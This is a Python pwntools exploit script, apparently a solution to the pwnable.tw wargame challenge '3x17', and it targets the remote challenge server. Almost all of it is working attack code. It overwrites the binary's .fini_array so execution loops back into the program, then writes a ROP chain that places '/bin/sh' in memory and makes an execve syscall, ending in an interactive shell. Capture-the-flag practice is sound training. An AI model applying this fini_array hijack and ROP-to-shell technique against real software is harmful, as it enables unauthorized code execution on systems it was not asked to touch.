from pwn import *
io = remote('chall.pwnable.tw', 10105)
#io = process('./3x17')

def act(addr, data):
    io.recvuntil('addr')
    io.send(str(addr))
    io.recvuntil('data')
    io.send(data)

#rbp = 0x7fffffffe4a0
#raw_input()
#for i in range(256):
'''
rop = p64(0x401c4b) # leave ret to jump to rop
rop += p64(0x401696) # pop rdi
rop += p64(0x4b4000)
rop += p64(0x446e35) # pop rdx
rop += '/bin/sh\x00'
rop += p64(0x432b53) # mov qword ptr [rdi], rdx
rop += p64(0x446e35) # pop rdx
rop += p64(0)
rop += p64(0x406c30) # pop rsi
rop += p64(0)
rop += p64(0x41e4af) # pop rax
rop += p64(59)
rop += p64(0x471db5) # syscall
'''
act(0x4b40f0, p64(0x402960) + p64(0x401b6d) + p64(0x0))
#raw_input()

act(0x4b40f0+0x18*4, p64(0x471db5))
act(0x4b40f0+0x18*3, p64(0) + p64(0x41e4af) + p64(59))
act(0x4b40f0+0x18*2, p64(0x446e35) + p64(0) + p64(0x406c30))
act(0x4b40f0+0x18*1, p64(0x446e35) + '/bin/sh\x00' + p64(0x432b53))
act(0x4b40f0, p64(0x401c4b) + p64(0x401696) + p64(0x4b4000))

io.interactive()


